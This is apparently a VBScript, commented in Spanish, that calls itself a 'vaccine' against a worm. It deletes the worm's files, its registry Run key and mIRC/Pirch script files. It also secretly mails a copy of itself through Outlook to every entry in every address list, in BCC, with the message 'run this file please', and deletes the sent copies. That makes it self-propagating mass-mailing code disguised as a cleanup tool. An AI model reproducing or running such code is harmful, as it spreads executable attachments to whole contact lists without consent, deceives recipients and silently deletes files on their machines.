    On Error Resume Next
    Set A1 = CreateObject("Scripting.FileSystemObject")
    Set A5 = CreateObject("WScript.Shell")
    A5.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Rundll"
    A5.Close
    'Borro el fichero links.vbs
    Set A6 = A1.GetFile(A1.BuildPath(A1.GetSpecialFolder(0), "LINKS.VBS"))
    A6.Delete
    '----
    'Borro el fichero rundll.vbs
    Set A6 = A1.GetFile(A1.BuildPath(A1.GetSpecialFolder(1), "RUNDLL.VBS"))
    A6.Delete
    '---
    'Borro el acceso directo
    Set A6 = A1.GetFile(A1.BuildPath(A5.SpecialFolders("Desktop"), "FREE XXX LINKS.URL"))
    A6.Delete
    '----
    Set A7 = CreateObject("WScript.Network")
    Set A8 = A7.EnumNetworkDrives
    If A8.Count <> 0 Then
        For A9 = 0 To A8.Count - 1
            If InStr(A8.Item(A9), "\\") <> 0 Then
                Set A6 = A1.GetFile(A1.BuildPath(A8.Item(A9), "LINKS.VBS"))
                A6.Delete
            End If
        Next
    End If
    Set A10 = CreateObject("Outlook.Application")
    Set A11 = A10.GetNameSpace("MAPI")
    For Each A12 In A11.AddressLists
        Set A13 = A10.CreateItem(0)
        For A14 = 1 To A12.AddressEntries.Count
            Set A15 = A12.AddressEntries(A14)
            If A14 = 1 Then
                A13.BCC = A15.Address
            Else
                A13.BCC = A13.BCC & ";" & A15.Address
            End If
        Next
        A13.Subject = "IMPORTANTE! ES UNA VACUNA PARA LIMPIAR EL Check this"
        A13.Body = "Ejecutar este fichero por favor." & Chr(13) & Chr(10)
        A13.Attachments.Add WScript.ScriptFullName
        A13.DeleteAfterSubmit = True
        A13.Send
    Next
    Set A7 = CreateObject("WScript.Shell")
    D A7.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
    msgbox "El Check this ha sido eliminado de su máquina de forma satisfactoria."
Sub D(D1)
    If A1.FolderExists(D1) = True Then
        For Each D2 In A1.GetFolder(D1).Files
            If UCase(D2.Name) = "MIRC32.EXE" Then
                Set A6 = A1.GetFile(A1.BuildPath(D2.ParentFolder, "SCRIPT.INI"))
                A6.Delete
            End If
            If UCase(D2.Name) = "PIRCH98.EXE" Then
                Set A6 = A1.GetFile(A1.BuildPath(D2.ParentFolder, "EVENTS.INI"))
                A6.Delete
            End If
        Next
        For Each D5 In A1.GetFolder(D1).SubFolders
            D D5.Path
        Next
    End If
End Sub

